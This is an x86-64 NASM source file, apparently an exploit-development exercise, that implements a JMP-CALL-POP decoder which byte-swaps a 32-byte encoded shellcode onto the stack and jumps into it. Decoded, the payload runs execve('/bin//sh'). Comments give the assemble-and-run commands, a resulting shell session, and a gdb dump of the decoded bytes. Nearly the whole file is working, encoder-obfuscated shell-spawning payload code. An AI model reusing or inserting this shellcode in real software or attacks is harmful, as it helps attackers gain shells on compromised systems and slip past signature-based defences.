global _start

section .text

_start:

	jmp find_address

decoder:
	pop rbx					;get the address of the string
	xor rdi, rdi
	xor rcx, rcx			;to keep the current position in encoded shellcode

allocate_space:
	sub rsp, 0x20
	mov r10, rsp
	jmp decode

cmp:
	inc rcx
	cmp rcx, 0x20			;32
	jge decoded_shell

decode:
	mov edi, dword [rbx+rcx]
	bswap edi
	mov dword [rsp], edi
	add rcx, 4
	add rsp, 4

	loop cmp

find_address:
	call decoder

	encoded_shellcode:	db	0x50,0xc0,0x31,0x48,0x62,0x2f,0xbb,0x48,0x2f,0x2f,0x6e,0x69,0x48,0x53,0x68,0x73,0x48,0x50,0xe7,0x89,0x48,0x57,0xe2,0x89,0x83,0x48,0xe6,0x89,0x05,0x0f,0x3b,0xc0

decoded_shell:
	mov rsp, r10		;get back to the top of the decoded shell in stack
	push r10			;put the address where decoded shell resides to the top of the stack so we can return to it
	ret
  
;  How to assemble, link and run the program
;==========================
; nasm -felf64 decoder.nasm -o decoder.o
; ld decoder.o -o decoder
; ./decoder
; $ whoami
; silvia

; Decoded shell in memory
; ==========================

; gdb-peda$ x/32bx $r10
; 0x7fffffffdda0:	0x48	0x31	0xc0	0x50	0x48	0xbb	0x2f	0x62
; 0x7fffffffdda8:	0x69	0x6e	0x2f	0x2f	0x73	0x68	0x53	0x48
; 0x7fffffffddb0:	0x89	0xe7	0x50	0x48	0x89	0xe2	0x57	0x48
; 0x7fffffffddb8:	0x89	0xe6	0x48	0x83	0xc0	0x3b	0x0f	0x05
